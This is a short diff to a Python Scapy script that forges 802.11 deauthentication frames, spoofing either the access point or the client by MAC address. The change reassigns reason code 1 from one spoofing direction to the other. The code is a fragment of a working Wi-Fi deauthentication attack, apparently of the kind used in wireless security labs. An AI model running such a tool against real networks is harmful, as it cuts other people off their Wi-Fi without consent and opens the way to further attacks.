@@ -38,11 +38,11 @@ conf.iface=args.Interface
 apToSTA = 2
 
 # Manage to witch device send packet (AP or STA)
-if reasonCode in [1, 4, 5]:
+if reasonCode in [4, 5]:
     # Send packet to STA with mac adress of AP
     packet = RadioTap() / Dot11(type=0, subtype=12, addr1=args.Client, addr2=args.BSSID, addr3=args.BSSID) / Dot11Deauth(reason=reasonCode)
     apToSTA = 1
-elif reasonCode in [8]:
+elif reasonCode in [1, 8]:
     # Send packet to AP with MAC address of STA
     packet = RadioTap() / Dot11(type=0, subtype=12, addr1=args.BSSID, addr2=args.Client, addr3=args.Client) / Dot11Deauth(reason=reasonCode)
     apToSTA = 0
